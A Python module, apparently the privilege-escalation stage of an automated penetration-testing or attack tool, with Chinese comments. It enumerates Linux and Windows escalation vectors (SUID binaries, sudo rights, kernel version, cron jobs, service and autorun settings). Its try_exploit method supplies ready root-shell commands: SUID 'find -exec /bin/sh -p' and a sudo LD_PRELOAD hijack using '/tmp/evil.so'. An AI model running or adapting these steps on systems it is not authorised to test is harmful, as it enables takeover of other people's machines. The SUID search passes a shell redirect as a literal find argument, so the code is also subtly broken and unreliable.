# -*- coding: utf-8 -*-
"""权限提升阶段：根据 OS 类型枚举提权向量。"""
from __future__ import annotations

import os
import platform
import re
import shutil
import subprocess
from typing import Any, Dict, List, Optional

DEFAULT_TIMEOUT = 120


def _run(cmd: List[str], timeout: int = DEFAULT_TIMEOUT) -> Dict[str, Any]:
    exe = shutil.which(cmd[0]) if cmd else None
    if not exe:
        return {"success": False, "error": f"工具 {cmd[0]} 未安装", "cmd": cmd}
    try:
        p = subprocess.run(
            [exe] + cmd[1:],
            capture_output=True,
            text=True,
            timeout=timeout,
            encoding="utf-8",
            errors="replace",
        )
        return {"success": p.returncode == 0, "cmd": cmd, "stdout": p.stdout, "stderr": p.stderr}
    except subprocess.TimeoutExpired:
        return {"success": False, "error": f"超时 ({timeout}s)", "cmd": cmd}
    except Exception as e:  # noqa: BLE001
        return {"success": False, "error": str(e), "cmd": cmd}


class PrivescPhase:
    """权限提升：Linux/Windows 双轨。"""

    name = "privesc"

    # ---------- OS 识别 ----------
    def detect_os(self) -> Dict[str, Any]:
        sysname = platform.system().lower()
        info = {
            "system": sysname,
            "release": platform.release(),
            "version": platform.version(),
            "arch": platform.machine(),
        }
        if sysname == "linux":
            try:
                with open("/etc/os-release", "r", encoding="utf-8", errors="replace") as f:
                    for line in f:
                        if line.startswith("PRETTY_NAME="):
                            info["distro"] = line.split("=", 1)[1].strip().strip('"')
                            break
            except Exception:  # noqa: BLE001
                pass
        return info

    # ---------- Linux 提权枚举 ----------
    def linux_enum(self) -> Dict[str, Any]:
        """真实枚举：当前用户 / SUID / sudo -l / 内核版本 / 定时任务。"""
        result: Dict[str, Any] = {}

        # 当前身份
        result["whoami"] = _run(["whoami"])
        result["id"] = _run(["id"])

        # SUID 文件
        result["suid"] = _run(["find", "/", "-perm", "-4000", "-type", "f", "2>/dev/null"], timeout=60)
        suid_files = [
            l for l in (result["suid"].get("stdout") or "").splitlines()
            if l.startswith("/") and not l.startswith("find:")
        ]
        result["suid_files"] = suid_files
        # GTFOBins 高价值 SUID
        gtfo = {"sudo", "su", "bash", "sh", "cp", "mv", "find", "vim", "nmap", "perl", "python", "ruby", "awk"}
        result["interesting_suid"] = [f for f in suid_files if os.path.basename(f) in gtfo]

        # sudo -l
        result["sudo_list"] = _run(["sudo", "-l", "-n"], timeout=15)

        # 内核版本
        result["uname"] = _run(["uname", "-a"])
        m = re.search(r"Linux version (\S+)", result["uname"].get("stdout", ""))
        result["kernel_version"] = m.group(1) if m else ""

        # 定时任务
        result["crontab"] = _run(["crontab", "-l"], timeout=10)
        result["cron_dirs"] = _run(["ls", "-la", "/etc/cron.d/"], timeout=10)

        # 可写敏感文件
        result["writable_passwd"] = os.access("/etc/passwd", os.W_OK)

        return result

    # ---------- Windows 提权枚举 ----------
    def windows_enum(self) -> Dict[str, Any]:
        result: Dict[str, Any] = {}
        result["whoami"] = _run(["whoami"])
        result["whoami_priv"] = _run(["whoami", "/priv"])
        result["systeminfo"] = _run(["systeminfo"], timeout=60)
        # 服务配置
        result["services"] = _run(["sc", "query", "type=", "service", "state=", "all"], timeout=30)
        # 自动启动
        result["autoruns"] = _run(["wmic", "Startup", "get", "Command,Location"], timeout=30)
        return result

    # ---------- 根据 OS 自动分发 ----------
    def run(self) -> Dict[str, Any]:
        os_info = self.detect_os()
        result: Dict[str, Any] = {"os": os_info}
        if os_info["system"] == "linux":
            result["enum"] = self.linux_enum()
        elif os_info["system"] == "windows":
            result["enum"] = self.windows_enum()
        else:
            result["enum"] = {"skipped": f"未支持的系统: {os_info['system']}"}
        return result

    # ---------- 尝试已知提权 ----------
    def try_exploit(self, vector: str) -> Dict[str, Any]:
        """根据枚举结果，尝试常见提权路径。"""
        vector = vector.lower()
        if vector == "suid_find":
            # find . -exec /bin/sh \;
            return {
                "vector": "suid_find",
                "cmd": "find . -exec /bin/sh -p \\; -quit",
                "note": "如果 find 是 SUID，可直接拿 root shell",
                "requires_manual": True,
            }
        if vector == "sudo_ld_preload":
            return {
                "vector": "sudo_ld_preload",
                "cmd": "sudo LD_PRELOAD=/tmp/evil.so /bin/bash",
                "note": "sudoers 允许 LD_PRELOAD 时可提权",
                "requires_manual": True,
            }
        if vector == "cve":
            return {
                "vector": "kernel_cve",
                "cmd": "建议使用 linux-exploit-suggester 匹配内核版本",
                "requires_manual": True,
            }
        return {"vector": vector, "note": "未知向量，需人工分析"}
